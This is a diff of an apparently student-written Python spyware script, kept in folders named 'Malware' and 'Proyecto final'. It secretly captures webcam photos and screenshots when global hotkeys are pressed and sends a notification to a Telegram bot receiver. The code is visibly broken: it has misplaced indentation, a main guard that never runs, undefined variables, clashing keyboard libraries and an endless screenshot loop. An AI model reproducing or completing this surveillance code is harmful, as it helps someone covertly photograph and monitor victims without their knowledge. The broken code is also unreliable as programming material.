@@ -10,11 +10,15 @@ from datetime import datetime
 from global_hotkeys import *
 
 import time
+from pynput import  keyboard
+
+
+
 
 
 cap = cv2.VideoCapture(0)
 ret, frame = cap.read()
-cv2.imwrite('C:\Users\juanm\OneDrive\Desktop\Malware\Algoritmos-maliciosos', frame)   
+cv2.imwrite('', frame)   #insertar dirrecion
 cap.release()
 bot = telepot.Bot(token)
 bot.notifyMessage(receiver_id, 'Picture Taken.') #enviar notificacion al usuario
@@ -26,7 +30,7 @@ def take_screenshot():
     image_name = f"screenshot-{str(datetime.now())}"
     screenshot = ImageGrab.grab()
 
-    filepathloc = f"C:\Users\juanm\OneDrive\Desktop\Malware\Algoritmos-maliciosos\malware.jpeg"
+    filepathloc = f"" #location de la imagen
 
     screenshot.save(filepath)
 
@@ -46,13 +50,22 @@ def Main():
 if __name__ == '__Main__':
     Main()
 
- def ctrlV():
-            def press_ctrl_v():
-                print('funcion activada')
-                takePhoto()
+ def take_picture():
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    cv2.imwrite("C:\\Users\\USER\\Desktop\\Proyecto final\\Camara\\picture.jpg", frame)
+    cap.release()
+    
 
-
-        hotkeys = {'<ctrl>+v': press_ctrl_v }
-
-        with keyboard.GlobalHotKeys(hotkeys) as escuchador:
-            escuchador.join()
+def capture_screen():
+    try:
+        os.mkdir('screenshots')
+    except FileExistsError:
+        pass
+    while True:
+        screenshot = pyautogui.screenshot()
+        screenshot_path = Path('C:\\Users\\USER\\Desktop\\Proyecto final\\Screenshots').joinpath('screenshot.png')
+        screenshot.save(screenshot_path)
+        
+keyboard.add_hotkey('ctrl+v', capture_screen)
+keyboard.add_hotkey('ctrl+x', take_picture)
